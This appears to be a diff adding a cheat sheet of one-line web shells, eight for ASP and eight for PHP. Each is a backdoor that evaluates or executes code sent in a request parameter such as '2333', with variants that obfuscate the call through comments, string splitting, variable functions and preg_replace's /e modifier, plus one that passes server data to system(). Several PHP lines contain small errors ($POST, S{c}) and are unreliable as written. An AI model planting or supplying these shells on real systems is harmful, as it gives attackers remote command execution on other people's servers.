@@ -1,0 +1,28 @@
+ASP
+1.<%eval request("2333")%>
+2.<%execute request("2333")%>
+3.<%execute(request("2333"))%>
+4.<%execute request("2333")%><%'<% loop <%:%>
+5.<%'<% loop <%:%><%execute request("2333")%>
+6.<%execute request("2333")'<% loop <%:%>
+7.<script language=vbs runat=server>eval(request("2333"))
+8.%><%eval(request(chr(35)))%><%
+
+
+-*- __________________________________________________________-*-
+PHP
+1.<?php eval($_POST[2333]);?>
+2.<?php @eval($POST[2333]);?>
+3.<?php assert($POST[2333]);?>
+4.<?$POST['sa']($_POST['2333']);?>
+5.<?$POST['sa']($_POST['2333'],$_POST['sc'])?>
+6.<?php @preg_replace("/[email]/e",$_POST[h],"error");?>
+7.<?php $c='ass'.'ert';S{c}($_POST[4]);?>
+8.<?php
+$b="";
+$a = array_values($_SERVER);
+ 
+$l=system($b.$a[6]);
+echo  $l;
+ 
+ ?>
